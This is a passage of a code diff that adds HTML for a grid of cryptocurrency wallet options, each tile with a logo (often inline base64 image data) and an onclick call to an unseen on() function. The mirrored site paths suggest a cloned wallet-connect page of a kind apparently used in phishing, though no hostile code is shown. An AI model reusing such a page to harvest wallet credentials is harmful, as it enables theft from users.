+                    <p><img height="100px" width="100px" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAA6lBMVEUAAAD///8pzMQpkZcDb30qlZsYV1ooyMAoipEqz8cq0sor1MwDc4Lm5uYAbXzExMTz8/MAZ3cgICAVFRX5+fmEhIS4uLg2NjYrKyuNjY1ubm7f39+tra0el5Egnph+fn5LS0s+Pj5dXV3W1tZmZmaioqJTU1OXl5eIiIivr68ODg4BNz4CWGMCUVwhsKzMzMwIKykYd3Imv7cTYV0bhoEBLjMCRU4NfIQjtrEBOD8ZmZoep6ULNzUFGxoOSEUcjYgeaW0DEhEfb3MKMjACW2cAJisAGRwWbmoVSUwaW14TYV4NREERVFAFGRjkH6YQAAAMWklEQVR4nM3da1sayRIA4EGYCAiCCAOCCgLeOIm36OquMQaze7KeJP//75weEBiYvlRVVzfWRz+MvM9cuvpWHWScR7V8GR3vddu9Zqu2OwpGu7VWs9fu7h1Hl+Wq+38fuLx4+fK4e7Qb6GL3qHt8WXb5I1wJy9HZkZa2HL2zyBXThbB83tbfOMXtbJ+7UHIL65VGi6CbRatdqTP/IlZhPepb6GYxjFiRjEIW3jT6Fb6fxSUctNl402h0mH4Zj3C/xuyL42if5bcxCMt7DnjT2GPICKyFHe7Hczna1g+rpbDD93VRRd/SaCX04LM3WgjLfnwTo0WyQxbWG958cTTIWQBVeOzVF8exV+HARftnitrAn7C7Bl8cXU/Cypp8cRDyVbzQbQtvirZz4WC0VmAQjLBvI1LoLgWFx55DYbW5bt0kmqh8HCO8XDdtHpduhKfrdiXi1IGwfrJu1VKcgLM4qLBqM4LmIlrQlxEoHKwbJAlgswETrjONUQcswQEJ/XckYAHqbkCE7xUIIwKEmFbi7s6ZRhqAVsMshCdq4z+2S6Udv0ZzCmcUgoF3H3OlnIjSzn9cklbDSDQJgY9ofPtysyht/+lWtRSmB9UghH1kZrcvYfzDsSsRhsF/vfAc8A+Wbt/CmPs0dm57i3O6ENCZuPu7JPF5Nmq7Gjphx3Rl+e1bGEsf//EBDALdoLhGWDVcVn37Esi//Rg1abhGqO9N6G9f0uijgWxRhPr+4OP9DgiY89RAnuCFhoZwo3hxv7MNNXpoPJTNokpo6i9tbhSKDwhjzrlR1ZdSCE1fGSHciI15hPGTY6Lia6MQGscsYmFsvMnCjaVP/3UpbGKEZ8bLTYUiijd/IYwfXRrP4EJALjMXCuPmX9tQo9sGUprbyIR1wMUSQvGwbggj+EY67EHKhhhlwiFWGBsfc++ggRzChKCBtRWhMBYeS3CjqwZS0mRIhKBLpYSx8R0kARAhbApbIowbD4zRSe8qPRGeEgJHt6XCDWyi48CYGglPCYGrLBTCSRIAT3Ry/D3ImkkIHf1VCtFG7gZydZR4RQhpCk3CjTjRgSdz7D3IulYIXimjF04SHYRxh3P4saETlsGXMQnFw7qJSXQ4G4+yRghfbWgWTpO5dTSQfbXQOLiGE2KTObbGY6AUIqbqYUJsMsfUgzxRCTFT2VDhJJkrYXqQHI3HQCHErLaAC4VxC5HMsTQeJ3Ih4i0MgkIBQcQlcxw9yI5UCOkWzuPLYRFrxCQ6tg1kXyaEt4XTuDooFnFGVDJn2XiUJUL8ssOn5wLKiEzmrIZYuxIh6UK3m0gjKpmzaSDTwn3ila43t3AvZGz0MMS6nxLS1639uEEaMckcuXfVXBVaLVz7jDY+5sBEqnGwIrTcYPDrAWnEJHO0BrK7IrQDivh6gTWiEh1CA7ksjKyFcRKANGJG5kQDib2P0ZKQZxsaOgkoAJM58fG9Dz8gf00/KTROF0IDmwTAkrnt+3w2ixa+TSgGbA/pLJBJgCmZi29fNg68MEoIefdKYpMAXTI3uX1EYX8hBI8hQgObBMiTufntIwqn44oToYNl3NgkoJhO5rZL+WzWSliZC53sJ/yFbSCXkrml20cVdudCR3sp0EnAfGRuO5fPhvbC1kyI7fvCAz0SUBBGcfvyqzyacNIPDiw6TpDAJwEXq4+nhXD/TYgaoEEHOgnI8wmHb0JKySNMjFBJAKdwdyp09xouApEEcArjFzHgTdnUAU4CWIXRROir/AMwCWAVNiZCTF01uwAlAazCo4mQHaKJr49GI6sw5uGmK+zDmATwCjtC6H33pCEJ4BVWhHANW7THt7rFKqzCUyF0m9HI4/ONL+FQCP3XSRBNo7entCmEvkt5/NjU+biFo0zANswGi2uDTykMw1fSP6wGXhsLs08hDMP7f2n/shN4bCwgPqkwDL+RV2hUAsgmSpa4BnahVoVhmCfevklEgafmEOpbFYbZlyurf3wamDePMATctywM86QPaDLOAg+VyXDj/HNhGL58t//n3cB56S7sYoY3YZh/ZVnH1w56HJdRx+0GzjcVisbhC9MP6AVOkza8LxaG2dcntp/QDNzVDhrdIhcUTYFbLzaNQypagbMaj5T7J3yPP3l/Ri1wM1g6Jt6/Q/XrN6a1i7uBi67FGLvgzez7/Y2Yeb8jX/FQfZPuXsKQ1nsK+I1U34Ha9+d9SO4fCh/ve0jzFYsH6ubhQz4M6T1g4eP8lj4946bS3nyFZ2X2Mn6dz5QShTXG9pB4/zS+f17CxVQpUdhiy2meDnBT2m++jVvlFb/ch8mpYKKwyZSXPh3gprPNvn9XZ7qJwl7AMVx6Rbt/m9eqCyZeP1vhkKF/eEW6f1tq39O3tI8s7Fr38a+Qyy0mUdja/KG84kso8ZGFZ5bjNETfjdoXBFIfWXhqNdbmwsctjCzGS78j1wTPfP8zXJdXWCGPeRPv34PJxy3sUOctaPfv4Rfg0rzCKnXuCc2D+piFI/L8IWaH5dR38RV4aVZhkzwHjBMKH3z4hVU4JM/j43bJooaXWIWn5LUYiJ3OuuEXWbAKK+T1NODd6luH2MkHVmGHvCYKWHFAN/yiClYhfV0bqGrEFsHHKzyir000C3XDE9rgFDbo60uN1VuoPl5hRF8jbKjAoxmeMAancLpGmJS36YQFGx+rcGSxVl+39O6BcL1EMAqHFvstDPfQZoKaUXhusWfG8B4Wnn8TLjoNRuFszwxlw4XxW0pp66fBJ9yd7+wirMcAVMLSTZfpgk+42LtGSL5hOc0hZcqaT7jYf0jYQwrMSzH9wlnwCRd7SAntBbxvcQEbu1gEm3BotZcb0z98+Iy6NJswuZcb/5ji+vg3GCObsJ6sqYB+TJGVsEzj3MngEg7t6mJg9/jq5pocCZfrYhA6+l8ekYPexQ2YkUuYWRZSphGxxUyAnSom4Wp9Gtp41NMBttpX8dm47JBJ2FkRUrfO/EZXNCuYElYeYapOlMWWdfQiYMMAI48wXevLZqMluqJZ8VEzSMwjzKSFVkf9oiuaaSZqWIQNidBy0/pnbLWvoiphZRHK6iZab0REFzNRJKwcwsQhCdT6pdL4iTbKElYOobx+KaoGrcqIrmiWTlgZhIoatDxH4mJXMBRSCSuDUFVHmOMmBviCLasL3OyFylrQbOcaj5+ROxGKhcQIq71QXc+br6rZGLvboliYJ6zWQk1NdtZCLrAdownjbITVWqirq89b5wSd6BQnCautUHs2AndtOnwy9/jTWqg/34L9hGp0Mrd1Ybkf33BGCficGXigy9PaCY3nzLC1GInAjVpZCs1nBTkpMfjTXHiHSQg478lRzaHv4GTOTijhpP/kqMoCNJmzEsLOXXNWsQY2amUjBJ6dx1+wdRGAZM5GCD3/EHKGJTmM5RUshOAzLB0XqbvWlhiyECLOISWPDwNDm8yRhaizZPkKfCtCk8yRhbjzgN1XcVMmc1Qh8kxn47ncDKFI5ohC9LncXIM22pAmc6pKWHnt6QiEs9WdVYheCskUpEwYhi/61fAtNUMj9FPnLJXMpYVh/tW0Sk7xlTEIXXSkZLFSSnlFCKpj1tEodEJ/ZTGTydxSnagw+w1Qqkb1GTULnVb6Xo6FcSGElqHb1xr0QvZhG03MRh9nQnH7YGXoVgdmcEKv1U2nydxEiChDp2wIgUK7qWFsxMmcEIrGAXxszp4JYBT6JcbJXDb/Ab57wAgECH2X4f2FOdnJ9IjChD4/N8gwfGTAwoy3+pjIOIf8eJDQ6bAGPaSDFkSh77LmoNClanhhpuqjp4GJlibZJgkzmd66TUuh7g/ShZ4bRn2Ym0GK0H8FfmVoOxMWwkz5fbyMrbL5pxKFmYyXqsOGkA/8cgnfQcsIawXpQtJGN8Zoo38vXrjWDw7mE0MXOjprDxDpKWxXwsxgHR/VVmoRgkOhzzGqWejHm/iFmbqvg7Cm0ZBN77oVivaf93xWXfRRbTybULyOHmZvRJzQXkAOoTD2nPt6Vj5roegbuz1NaQjs5zoUivfR3TenYfH+MQpF7Ls4f++I2j4sB49QvJDc6WrD+vF8Cy6hiIjvy9qP+H4WozCTqZ5zNJHDiNy6y4JVKKJe6drkrLV2hZWX4RfGUd4fUmrZj9rnDJ/OVLgQxlGOzjDf16NG5EIXhyvhJMqV07ZphVyzfVpxhZuEU+E0quXL6Hiv2+41W7XdUTDarbWavXZ37zi6LEMHri3i//OIVcHCfqKeAAAAAElFTkSuQmCC" />
+                    </p>Zilliqa Wallet
+                </div>
+
+            </div>
+
+            <div class="col-sm-4" style="column-count: 2; ">
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/hwmAJe-5v3STAgT7T9_EamcCto9BpOizz8x7D2FIbpmJB0LJ0ceE4VgYjhRnYi4HfEA" />
+                    </p>Algorand Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/aeternity/info/logo.png" />
+                    </p>Aeternity Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ46ieKCQtugl40iawa8rUW3od3tWase4CN7g&amp;usqp=CAU" />
+                    </p>Aion Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../s2.coinmarketcap.com/static/img/coins/200x200/8695.png" />
+                    </p>Blank Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/IjPzhdFXpygSue3ciFDJr-201PhDt6YuJIufwFeFbYp_UqwqxSgb23IDDObA6hPYxg" />
+                    </p>Exodus Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/fio/info/logo.png" />
+                    </p>FIO Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/gochain/info/logo.png" />
+                    </p>Gochain Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/7DVRyaZnvFjerpRePCH_d0WfY2v8JyE5tcUW4H7UviWPzvBJMeuRQqHcb24tyBFZQQ" />
+                    </p>Guard Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/sDNtmdHgfQYtQvUtQ-AurSy7GoQ4c2JHey4LaUoxR9kBZDMYXaVZrjP0qJLVQM94eDuI" />
+                    </p>Kardiachain Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/kava/info/logo.png" />
+                    </p>Kava Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/kin/info/logo.png" />
+                    </p>Kin Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../s2.coinmarketcap.com/static/img/coins/200x200/6724.png" />
+                    </p>Klever Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../www.buybitcoinworldwide.com/img/customicons/monerowallet.png" />
+                    </p>Monero Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../pbs.twimg.com/profile_images/1196102429810536450/JJfTT5S2.jpg" />
+                    </p>Moonlet Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/nano/info/logo.png" />
+                    </p>Nano Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="data:image/png;base64,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" />
+                    </p>Nebulas Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../assets-cdn.trustwallet.com/blockchains/poa/info/logo.png" />
+                    </p>Poa Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../miro.medium.com/max/600/0_1sgyC47urJiKMBeU.png" />
+                    </p>Scatter Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../pbs.twimg.com/profile_images/1146467356044083202/qz1-1t1L_400x400.png" />
+                    </p>Squarelink Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../upload.wikimedia.org/wikipedia/commons/5/56/Stellar_Symbol.png" />
+                    </p>Stellar Wallet
+                </div>
+
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/1yYDrRYR-2LmMvLyR7oTXPKZd9zt42iyLJCgp0QK4Y0e56n-Zt1rlEfOaMTRKSt0AYQ" />
+                    </p>Vechain Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="../external.html?link=https://play-lh.googleusercontent.com/n1ihzp8dyH6OnWJZVe1xP95TpwrhwIC4_wyBPzhkdbRL4ON1ToOLp0z3LQHDgzrhW1I" />
+                    </p>Velicwallet Wallet
+                </div>
+                <div onclick="on()" style="cursor: pointer; margin-bottom: 50px;">
+                    <p><img height="100px" width="100px" src="data:image/jpeg;base64,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